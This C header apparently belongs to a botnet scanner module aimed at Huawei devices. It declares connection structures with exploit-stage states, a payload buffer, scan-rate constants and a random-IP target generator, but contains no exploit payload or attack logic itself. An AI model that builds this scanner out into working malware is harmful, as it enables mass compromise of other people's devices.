#pragma once
#include <stdint.h>
#include "includes.h"


#define huaweiscanner_SCANNER_MAX_CONNS 256
#define huaweiscanner_SCANNER_RAW_PPS 320

#define huaweiscanner_SCANNER_RDBUF_SIZE 256
#define huaweiscanner_SCANNER_HACK_DRAIN 64

struct huaweiscanner_scanner_connection
{
	int fd, last_recv;
	enum
	{
		huaweiscanner_SC_CLOSED,
		huaweiscanner_SC_CONNECTING,
		huaweiscanner_SC_EXPLOIT_STAGE2,
		huaweiscanner_SC_EXPLOIT_STAGE3,
	} state;
	ipv4_t dst_addr;
	uint16_t dst_port;
	int rdbuf_pos;
	char rdbuf[huaweiscanner_SCANNER_RDBUF_SIZE];
	char payload_buf[1024];
};

void huawei_init();
void huawei_kill(void);

static void huawei_setup_connection(struct huaweiscanner_scanner_connection *);
static ipv4_t huawei_get_randomip(void);
